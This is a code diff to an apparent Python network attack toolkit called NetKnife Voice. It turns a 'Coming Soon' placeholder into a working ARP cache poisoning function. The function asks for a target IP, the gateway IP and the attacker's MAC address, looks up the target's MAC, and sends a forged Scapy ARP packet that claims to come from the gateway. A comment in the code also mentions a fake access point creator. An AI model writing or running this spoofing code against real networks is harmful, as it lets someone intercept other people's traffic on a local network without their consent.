@@ -7,6 +7,7 @@ import hashlib
 import nmap
 import socket
 from playsound import playsound
+from getmac import get_mac_address
 
 os.system("clear")
 print Fore.BLUE + "Started NetKnife Voice"
@@ -61,7 +62,39 @@ print Fore.GREEN + ("-----------------------------------------------------------
 #This tool is used to implement the Arp Cache Poisoning attack on the target
 
 def Arp():
-    print "Coming Soon"
+    #print "Coming Soon"
+	print """
+
+	       d8888               8888888b.         d8b                                        
+	      d88888               888   Y88b        Y8P                                        
+	     d88P888               888    888                                                   
+	    d88P 888888d88888888b. 888   d88P .d88b. 888.d8888b  .d88b. 88888b.  .d88b. 888d888 
+	   d88P  888888P"  888 "88b8888888P" d88""88b88888K     d88""88b888 "88bd8P  Y8b888P"   
+	  d88P   888888    888  888888       888  888888"Y8888b.888  888888  88888888888888     
+	 d8888888888888    888 d88P888       Y88..88P888     X88Y88..88P888  888Y8b.    888     
+	d88P     888888    88888P" 888        "Y88P" 888 88888P' "Y88P" 888  888 "Y8888 888     
+	                   888                                                                  
+	                   888                                                                  
+	                   888                                                                  
+
+	"""
+
+	TargetAddr = raw_input("Please Enter The Target IP Address: ")
+	GetawayIP = raw_input("Please Enter The Getaway IP Address: ")
+	Mac = raw_input("Please Enter The Your System Mac Address: ")
+	TargetMac = get_mac_address(ip=TargetAddr)
+	ArpP = ARP()
+	ArpP.psrc = GetawayIP
+	ArpP.pdst = TargetAddr
+	ArpP.hwdst = TargetMac
+	ArpP.hwsrc = Mac
+
+	send(ArpP)
+	print "[+]The Attack Took Place"
+
+
+
+
 
 
 #[2]:Fake Access Point Creator Tools
